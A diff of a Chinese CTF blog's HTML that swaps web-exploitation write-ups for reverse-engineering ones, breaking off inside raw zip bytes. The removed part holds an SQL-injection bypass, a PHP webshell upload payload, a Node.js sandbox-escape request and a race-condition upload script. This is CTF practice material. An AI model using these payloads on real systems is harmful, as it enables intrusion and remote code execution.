class="string">&quot;text&quot;</span> name=<span class="string">&quot;page&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">      id : &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;index.phps&quot;</span>&gt;view-source&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123;</span><br><span class="line">       <span class="variable">$con</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">       <span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       <span class="variable">$filename</span> = <span class="string">&quot;backup/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;Bad file extension&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            chdir(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">           <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">           fwrite(<span class="variable">$f</span>, <span class="variable">$con</span>);</span><br><span class="line">           fclose(<span class="variable">$f</span>);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br><span class="line">		<span class="comment">//如果session 是admin的session  就执行 </span></span><br><span class="line">         	<span class="comment">//CON 和file 是post的con 和file </span></span><br><span class="line">             <span class="comment">// 文件目录是backup/加上file</span></span><br><span class="line">         <span class="comment">//之后是对于con的waf</span></span><br><span class="line">         <span class="comment">//如果绕过waf ，文件就被提交到uploaded</span></span><br><span class="line">         <span class="comment">//con 是命令执行  就是传马的 所以最后是uploaded/backup/</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; floatval(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; substr(<span class="variable">$_GET</span>[id], -<span class="number">1</span>) === <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$id</span> = mysql_real_escape_string(<span class="variable">$_GET</span>[id]);</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select * from cetc007.user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span> = mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">False</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!<span class="variable">$result</span>)<span class="keyword">die</span>(<span class="string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span>.<span class="variable">$result</span>-&gt;id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$result</span>-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span>;</span><br><span class="line">      &#125;</span><br><span class="line">	<span class="comment">//就是你要有id id转浮点数不等于1 id最后一位是9 这个地方用万能密码绕过</span></span><br><span class="line">	<span class="comment">//可以让session 为admin</span></span><br><span class="line">     <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>给出payload</p>
-<p>url 是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://111.200.241.244:49771/index.php</span><br><span class="line">?page=flag.php</span><br><span class="line">&amp;id=1&#x27;or &#x27;9&#x27;=&#x27;9</span><br><span class="line">&amp;submit=%E6%8F%90%E4%BA%A4</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
-
-<p>data段是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">con=&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;])?&gt;&quot;&amp;file=d.php/cmd.php/..</span><br></pre></td></tr></table></figure>
-
+  <h1 id="1-Hello-CTF"><a href="#1-Hello-CTF" class="headerlink" title="1_Hello, CTF"></a>1_Hello, CTF</h1><p>把文件放入ida</p>
+<p>搜索main函数 按下万能的F5</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa5v7golmj30is0kz10l.jpg" alt="image1.png"></p>
+<h2 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h2><p> <strong>void *memset(void *str, int c, size_t n)</strong> 复制字符 <strong>c</strong>（一个无符号字符）到参数 <strong>str</strong> 所指向的字符串的前 <strong>n</strong> 个字符。</p>
+<h2 id="strcat"><a href="#strcat" class="headerlink" title="strcat"></a>strcat</h2><p>C 库函数 <strong>char *strcat(char *dest, const char *src)</strong> 把 <strong>src</strong> 所指向的字符串追加到 <strong>dest</strong> 所指向的字符串的结尾。</p>
+<h2 id="sub-40134B"><a href="#sub-40134B" class="headerlink" title="sub_40134B"></a>sub_40134B</h2><p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa5z8pppmj30cb075dh1.jpg" alt="image.png"></p>
+<p>我对于这个函数的理解是将定好的内容输出</p>
+<p>比如第一个就是输出 please input your serial</p>
+<h1 id="整体看一遍"><a href="#整体看一遍" class="headerlink" title="整体看一遍"></a>整体看一遍</h1><p>关键点在这里 </p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa62ybzrrj307m02dt97.jpg" alt="image.png"></p>
+<p>需要让v10 和v13 相等</p>
+<p><img src="C:\Users\jw5t\AppData\Roaming\Typora\typora-user-images\image-20211110171239426.png" alt="image-20211110171239426"></p>
+<p>说明是转了16进制</p>
+<p>在线转  <a target="_blank" rel="noopener" href="https://www.bejson.com/convert/ox2str/">https://www.bejson.com/convert/ox2str/</a></p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa67ecfj9j30st0e2gow.jpg" alt="image.png"></p>
+<p> flag ： CrackMeJustForFun</p>
  
       <!-- reward -->
       
@@ -319,40 +231,52 @@
 
     
     <article
-  id="post-leaking"
+  id="post-5_game"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/5_game/"
+    >5_game</a> 
+</h2>
+ 
+
+      
+    </header>
      
     <div class="article-meta">
-      <a href="/2021/11/15/leaking/" class="article-date">
-  <time datetime="2021-11-15T09:41:28.153Z" itemprop="datePublished">2021-11-15</time>
-</a>    
+      <a href="/2019/05/26/5_game/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/">逆向</a> / <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a>
+  </div>
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <p>nodejs沙箱逃逸</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwerdkcp2pj30u20ssqfb.jpg" alt="image.png"></p>
-<p>eval(“var flag_” + randomstring.generate(64) + “ = &quot;flag{“ + flag + “}&quot;;”)</p>
-<p>  if (<em>req</em>.query.data &amp;&amp; <em>req</em>.query.data.length &lt;= 12) {</p>
-<p>​    <em>var</em> vm = new VM({</p>
-<p>​      timeout: 1000</p>
-<p>​    });</p>
-<p>​    console.log(<em>req</em>.query.data);</p>
-<p>​    <em>res</em>.send(“eval -&gt;” + vm.run(<em>req</em>.query.data));</p>
-<p>  } else {</p>
-<p>​    <em>res</em>.send(fs.readFileSync(__filename).toString());</p>
-<p>  }</p>
-<p>其中 要满足<em>req</em>.query.data &amp;&amp; <em>req</em>.query.data.length &lt;= 12</p>
-<p>有get data  且长度小于12</p>
-<p>eval -&gt;” + vm.run(<em>req</em>.query.data</p>
-<p>构建payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> _thread</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>():</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://111.200.241.244:65075/?data=Buffer(1000)&quot;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;42vk7uq3siu00csvncvn1cr3o4&quot;</span>, <span class="string">&quot;td_cookie&quot;</span>: <span class="string">&quot;298269563&quot;</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;If-None-Match&quot;</span>: <span class="string">&quot;W/\&quot;599-+8B/Bay7p6jffTGBFcikJZKicLY\&quot;&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">result</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + re.match(<span class="string">&quot;(.*)flag&#123;(.*)&#125;(.*)&quot;</span>, result).group(<span class="number">2</span>) + <span class="string">&quot;&#125;\n\n\n\n\n\n\n&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        <span class="comment"># try:</span></span><br><span class="line">        <span class="comment">#     _thread.start_new_thread(check(req()))</span></span><br><span class="line">        <span class="comment"># except:</span></span><br><span class="line">        <span class="comment">#     print(&quot;error&quot;)</span></span><br><span class="line">        check(req())</span><br></pre></td></tr></table></figure>
+  <h1 id="5-game"><a href="#5-game" class="headerlink" title="5_game"></a>5_game</h1><p>丢ida 找main f5</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa9u3wrzcj31ld0x41kx.jpg" alt="image.png"></p>
+<p>很容易发现 </p>
+<p>sub_457AB4(); 就是flag</p>
+<p>进入<img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa9vdyxu3j307o0390t5.jpg" alt="image.png"></p>
+<p>在进入</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa9vxqnzpj30gd0lu79k.jpg" alt="image.png"></p>
+<h2 id="qmemcpy"><a href="#qmemcpy" class="headerlink" title="qmemcpy"></a>qmemcpy</h2><p>  void * memcpy ( void * dest, const void * src, size_t num );</p>
+<p>并不关心被复制的数据类型，只是逐字节地进行复制，这给函数的使用带来了很大的灵活性，可以面向任何数据类型进行复制。</p>
+<h2 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h2><p>拷贝一个字符串到另一个字符串数组中</p>
+<p>根据题目构建python脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">v6 = []</span><br><span class="line">v3 = []</span><br><span class="line">v4 = []</span><br><span class="line">for i in range(22):</span><br><span class="line">  v3.append(1)</span><br><span class="line">for i in range(57):</span><br><span class="line">  v6.append(1)</span><br><span class="line"></span><br><span class="line">v6[0] = 18</span><br><span class="line">v6[1] = 64</span><br><span class="line">v6[2] = 98</span><br><span class="line">v6[3] = 5</span><br><span class="line">v6[4] = 2</span><br><span class="line">v6[5] = 4</span><br><span class="line">v6[6] = 6</span><br><span class="line">v6[7] = 3</span><br><span class="line">v6[8] = 6</span><br><span class="line">v6[9] = 48</span><br><span class="line">v6[10] = 49</span><br><span class="line">v6[11] = 65</span><br><span class="line">v6[12] = 32</span><br><span class="line">v6[13] = 12</span><br><span class="line">v6[14] = 48</span><br><span class="line">v6[15] = 65</span><br><span class="line">v6[16] = 31</span><br><span class="line">v6[17] = 78</span><br><span class="line">v6[18] = 62</span><br><span class="line">v6[19] = 32</span><br><span class="line">v6[20] = 49</span><br><span class="line">v6[21] = 32</span><br><span class="line">v6[22] = 1</span><br><span class="line">v6[23] = 57</span><br><span class="line">v6[24] = 96</span><br><span class="line">v6[25] = 3</span><br><span class="line">v6[26] = 21</span><br><span class="line">v6[27] = 9</span><br><span class="line">v6[28] = 4</span><br><span class="line">v6[29] = 62</span><br><span class="line">v6[30] = 3</span><br><span class="line">v6[31] = 5</span><br><span class="line">v6[32] = 4</span><br><span class="line">v6[33] = 1</span><br><span class="line">v6[34] = 2</span><br><span class="line">v6[35] = 3</span><br><span class="line">v6[36] = 44</span><br><span class="line">v6[37] = 65</span><br><span class="line">v6[38] = 78</span><br><span class="line">v6[39] = 32</span><br><span class="line">v6[40] = 16</span><br><span class="line">v6[41] = 97</span><br><span class="line">v6[42] = 54</span><br><span class="line">v6[43] = 16</span><br><span class="line">v6[44] = 44</span><br><span class="line">v6[45] = 52</span><br><span class="line">v6[46] = 32</span><br><span class="line">v6[47] = 64</span><br><span class="line">v6[48] = 89</span><br><span class="line">v6[49] = 45</span><br><span class="line">v6[50] = 32</span><br><span class="line">v6[51] = 65</span><br><span class="line">v6[52] = 15</span><br><span class="line">v6[53] = 34</span><br><span class="line">v6[54] = 18</span><br><span class="line">v6[55] = 16</span><br><span class="line">v6[56] = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v3[0] = 123</span><br><span class="line">v3[1] = 32</span><br><span class="line">v3[2] = 18</span><br><span class="line">v3[3] = 98</span><br><span class="line">v3[4] = 119</span><br><span class="line">v3[5] = 108</span><br><span class="line">v3[6] = 65</span><br><span class="line">v3[7] = 41</span><br><span class="line">v3[8] = 124</span><br><span class="line">v3[9] = 80</span><br><span class="line">v3[10] = 125</span><br><span class="line">v3[11] = 38</span><br><span class="line">v3[12] = 124</span><br><span class="line">v3[13] = 111</span><br><span class="line">v3[14] = 74</span><br><span class="line">v3[15] = 49</span><br><span class="line">v3[16] = 83</span><br><span class="line">v3[17] = 108</span><br><span class="line">v3[18] = 94</span><br><span class="line">v3[19] = 108</span><br><span class="line">v3[20] = 84</span><br><span class="line">v3[21] = 6</span><br><span class="line"></span><br><span class="line">temp = &quot;`S,yhn _uec&#123;&quot;</span><br><span class="line">for i in temp:</span><br><span class="line">  # print(ord(i))</span><br><span class="line">  v3.append(ord(i))</span><br><span class="line"># print(v3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># for i in range(111):</span><br><span class="line">#   # print(ord(i))</span><br><span class="line">#   v3.append(1)</span><br><span class="line">v3.append(127)</span><br><span class="line">v3.append(119)</span><br><span class="line">v3.append(96)</span><br><span class="line">v3.append(48)</span><br><span class="line">v3.append(107)</span><br><span class="line">v3.append(71)</span><br><span class="line">v3.append(92)</span><br><span class="line">v3.append(29)</span><br><span class="line">v3.append(81)</span><br><span class="line">v3.append(107)</span><br><span class="line">v3.append(90)</span><br><span class="line">v3.append(85)</span><br><span class="line">v3.append(64)</span><br><span class="line">v3.append(12)</span><br><span class="line">v3.append(43)</span><br><span class="line">v3.append(76)</span><br><span class="line">v3.append(86)</span><br><span class="line">v3.append(13)</span><br><span class="line">v3.append(114)</span><br><span class="line">v3.append(1)</span><br><span class="line"></span><br><span class="line"># print(len(v3))</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">temp = &quot;u~&quot;</span><br><span class="line">for i in temp:</span><br><span class="line">  # print(ord(i))</span><br><span class="line">  v3.append(ord(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(56):    #56</span><br><span class="line">  v3[i] ^= v6[i]</span><br><span class="line">  v3[i] ^= 0x13</span><br><span class="line">for i in range(len(v3)):</span><br><span class="line">  print(chr(v3[i]),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>
 
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa9z6sd93j30qr09bgoh.jpg" alt="image.png"></p>
+<p>zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t}</p>
  
       <!-- reward -->
       
@@ -373,43 +297,117 @@
 
     
     <article
-  id="post-条件竞争"
+  id="post-3_python-trade"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/3_python-trade/"
+    >3_python-trade</a> 
+</h2>
+ 
+
+      
+    </header>
      
     <div class="article-meta">
-      <a href="/2021/11/15/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" class="article-date">
-  <time datetime="2021-11-15T09:41:28.151Z" itemprop="datePublished">2021-11-15</time>
-</a>    
+      <a href="/2019/05/26/3_python-trade/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/">逆向</a> / <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a>
+  </div>
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <p>import requests<br>import threading</p>
-<p>def scan():<br>    burp0_url = “<a target="_blank" rel="noopener" href="http://192.168.38.160:1007/upload.php&quot;">http://192.168.38.160:1007/upload.php&quot;</a><br>    burp0_url1 = “<a target="_blank" rel="noopener" href="http://192.168.38.160:1007/tmp/uploads/&quot;">http://192.168.38.160:1007/tmp/uploads/&quot;</a><br>    burp0_cookies = {“node”: “bWF4X2FsbG93ZWRfcGFja2V0”}<br>    burp0_headers = {“Pragma”: “no-cache”, “Cache-Control”: “no-cache”, “Upgrade-Insecure-Requests”: “1”,<br>                     “User-Agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36”,<br>                     “Origin”: “<a href="http://192.168.38.160:1007&quot;">http://192.168.38.160:1007&quot;</a>,<br>                     “Content-Type”: “multipart/form-data; boundary=—-WebKitFormBoundaryWoFwKBXGzbWzFApV”,<br>                     “Accept”: “text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9”,<br>                     “Referer”: “<a target="_blank" rel="noopener" href="http://192.168.38.160:1007/&quot;">http://192.168.38.160:1007/&quot;</a>, “Accept-Encoding”: “gzip, deflate”,<br>                     “Accept-Language”: “zh-CN,zh;q=0.9”, “Connection”: “close”}<br>    burp0_data = “——WebKitFormBoundaryWoFwKBXGzbWzFApV\r\nContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;A.zip&quot;\r\nContent-Type: application/x-zip-compressed\r\n\r\nPK\x03\x04\x14\x00\x00\x00\x08\x00\xd4]mS\xedA\x00\xbb\xad\x06\x00\x00t\x12\x04\x00\x05\x00\x00\x00A.txt\xec\xd3\xc1\t\x84\x00\x10\x04\xc1\xbf<code>\x90\xe6\x9f\x84\x19\\?\x8eA\xc1\xaa\x08\x96f\xe7\xba\xf8\xe1&lt;\x9e\xbe\xe0\xe5\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\x82\x19\xf3\n\xe7!Q\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xe6\xc5?\xfcO\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10\x08f\xcc+\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\xc1\x8cy\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A \x981\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xe6\x15\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81</code>\xc6\xbc\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 \x10\xcc\x98W\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\x82\x19\xf3\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c^A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10\x08f\xcc+\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\xc1\x8cy\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A \x981\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xe6\x15\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81<code>\xc6\xbc\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 \x10\xcc\x98W\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\x82\x19\xf3\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c^A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10\x08f\xcc+\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\xc1\x8cy\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(|*\xd0\r\x00\x00\xff\xff\xec\xd3A\t\x00@\x10\xc40\xff\xaeOB\xe1</code>\x1e\x0b\x89\x84B\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 